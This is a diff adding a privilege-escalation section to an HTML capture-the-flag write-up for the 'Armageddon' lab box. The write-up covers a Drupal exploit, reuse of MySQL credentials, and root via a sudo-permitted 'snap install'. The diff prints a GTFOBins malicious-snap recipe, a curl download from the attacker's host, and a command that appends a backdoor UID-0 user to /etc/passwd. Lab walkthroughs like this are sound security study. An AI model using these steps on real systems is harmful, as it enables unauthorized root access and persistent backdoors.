@@ -25,7 +25,7 @@ layout: default
 
     <h2><a id="summary">Summary</a></h2>
 
-    <p></p>
+    <p>Armageddon starts of by exploiting the drupal web server.  The exploit name is in the name of the box.  After gaining the apache shell, mysql creds can be found in a web server config file.  Credentials for brucetherealadmin are gained from mysql.  As brucetherealadmin we have a sudo abilit to install snap packges.  We install a malicious snap package and gain root.</p>
 
     <h2><a id="portscan">Port Scanning</a></h2>
 
@@ -139,6 +139,51 @@ cat sites/default/settings.php | grep CQHEy@ -A 5 -B 5&#13;&#10;  array (&#13;&#
 
     <br>
     <h2><a id="root">Shell - Root</a></h2>
+
+    <li>After gaining access as brucetherealadmin, I check sudo -l for sudo abilities.</li>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ sudo -l&#13;&#10;Matching Defaults entries for brucetherealadmin on armageddon:&#13;&#10;    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY&#13;&#10;    HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,&#13;&#10;    env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC&#13;&#10;    LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,&#13;&#10;    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin&#13;&#10;&#13;&#10;User brucetherealadmin may run the following commands on armageddon:&#13;&#10;    (root) NOPASSWD: /usr/bin/snap install *
+    </pre>
+
+    <li>We have sudo permissions to snap install *, so I check the website GTFOBins to see how we can exploit this ability.</li>
+
+    <pre>
+COMMAND=id&#13;&#10;cd $(mktemp -d)&#13;&#10;mkdir -p meta/hooks&#13;&#10;printf &apos;#!/bin/sh\n%s; false&apos; &quot;$COMMAND&quot; &gt;meta/hooks/install&#13;&#10;chmod +x meta/hooks/install&#13;&#10;fpm -n xxxx -s dir -t snap -a all meta&#13;&#10;&#13;&#10;sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+    </pre>
+
+    <li>It appears all we need to do is create a malicious snap file and then install it.  In order to do this, I installed fpm on my Kali machine in order to create the malicious snap file.  Then I transferred this file to the victim using curl.</li>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ curl http://10.10.14.30/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
+    </pre>
+
+    <li>Then I install it, which executed the bash command that I built into the malicious snap package.  The bash command I used is adding a 2nd root user to the /etc/passwd file.</li>
+    <ul>
+        <li>My malicious command: echo "root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash" >> /etc/passwd</li>
+        <ul>
+            <li>The password hash is for the password: root</li>
+        </ul>
+    </ul>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install ./xxxx_1.0_all.snap --dangerous --devmode&#13;&#10;xxxx 1.0 installed
+    </pre>
+
+    <pre>
+[brucetherealadmin@armageddon tmp]$ cat /etc/passwd | tail&#13;&#10;nobody:x:99:99:Nobody:/:/sbin/nologin&#13;&#10;systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin&#13;&#10;dbus:x:81:81:System message bus:/:/sbin/nologin&#13;&#10;polkitd:x:999:998:User for polkitd:/:/sbin/nologin&#13;&#10;sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin&#13;&#10;postfix:x:89:89::/var/spool/postfix:/sbin/nologin&#13;&#10;apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin&#13;&#10;mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin&#13;&#10;brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash&#13;&#10;root2:S3g6q5KuTzNkU:0:0:root:/root:/bin/bash
+    </pre>
+
+    <li>Now I switch to the root2 user and we have our root shell.</li>
+
+    <pr>
+[brucetherealadmin@armageddon tmp]$ su root2&#13;&#10;Password: &#13;&#10;[root@armageddon tmp]# id&#13;&#10;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+    </pr>
+
+
+
+
+
 
 </body>
 </html>
